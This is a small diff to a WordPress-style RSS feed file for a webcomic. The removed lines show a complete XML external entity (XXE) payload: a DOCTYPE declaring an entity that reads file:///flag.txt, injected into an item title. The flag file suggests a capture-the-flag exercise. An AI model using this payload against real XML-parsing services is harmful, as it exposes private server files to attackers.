@@ -1,9 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
 
-<!DOCTYPE foo [  
-<!ELEMENT foo ANY >
-<!ENTITY xxe SYSTEM "file:///flag.txt" >]>
-
 
 <rss version="2.0"
 	xmlns:content="http://purl.org/rss/1.0/modules/content/"
@@ -25,7 +21,7 @@
 	<sy:updateFrequency>1</sy:updateFrequency>
 	<generator>https://wordpress.org/?v=4.7.11</generator>
 	<item>
-		<title>&xxe;</title>
+		<title>xxe</title>
 		<link>https://www.prequeladventure.com/2019/01/14718/</link>
 		<comments>https://www.prequeladventure.com/2019/01/14718/#respond</comments>
 		<pubDate>Thu, 31 Jan 2019 02:16:29 +0000</pubDate>
